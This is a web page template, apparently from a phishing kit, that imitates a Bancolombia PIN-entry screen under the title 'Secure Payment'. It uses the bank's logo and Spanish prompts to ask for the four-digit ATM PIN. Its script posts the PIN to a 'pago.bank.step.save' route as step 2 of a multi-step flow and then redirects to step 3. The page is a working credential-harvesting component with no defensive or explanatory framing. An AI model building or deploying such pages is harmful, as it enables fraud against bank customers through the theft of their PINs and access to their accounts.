<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <link rel="stylesheet" href="{{asset('assets/css/payment/bancolombia.css')}}">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    
        <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>


    <title>Secure Payment</title>

</head>
<body style="background-color:#2c2a29;">
<div id="trazo">

<div style="text-align: center;">
    <br>

    <img src="{{asset('assets/img/payment/bancolombia/logo.png')}}" alt="" srcset="" width="100%">
<br>
    <br>
    <a style="font-size:30px; color:#fff;">Ingresa tu clave</a>
</div>


<div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:#454648; height:290px; padding:20px; margin:auto;">

<div style="text-align: center;">
    <br>
    <a style="font-size:16px; text-align:center; color:#fff;">Es la misma que utilizas en el cajero</a>
    <br>
    <br>
    <input type="text" name="user" id="txtPassword" placeholder="****" style="border:none; width:90%; height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="4" minlenght="4" oninput="this.value = this.value.replace(/\D+/g, '');">
    <br>
</div>
    <a style="position:absolute; color:#fff; right: 10%; margin-top:6px"><small>¿olvidaste tu clave?</small></a>

<br>
<br>
<br>
<div style="text-align: center;">
    <input type="submit" value="Continuar" id="btnPass" style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;">
</div>

</div>



<script type="text/javascript">

	$(document).ready(function() {

        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

		$('#btnPass').on('click', function (e) {
            e.preventDefault();

            const pass = $("#txtPassword").val();
			if (pass.length > 3) {
				 $.ajax({
                    url: "{{ route('pago.bank.step.save', [
                        'bank' => 'bancolombia',
                        'step' => 2
                    ]) }}",
                    method: 'POST',
                    data: {
                        pass: pass
                    },
                    success: function() {
                        window.location.href = "{{ route('pago.bank.step', ['bank' => 'bancolombia', 'step' => 3]) }}";
                    },
                    error: function(xhr, status, error) {
                        console.log("Warning")
                    }
                });
			}else{
				$(".mensaje").show();
			}	
		});

				
	});
</script>
</body>
</html>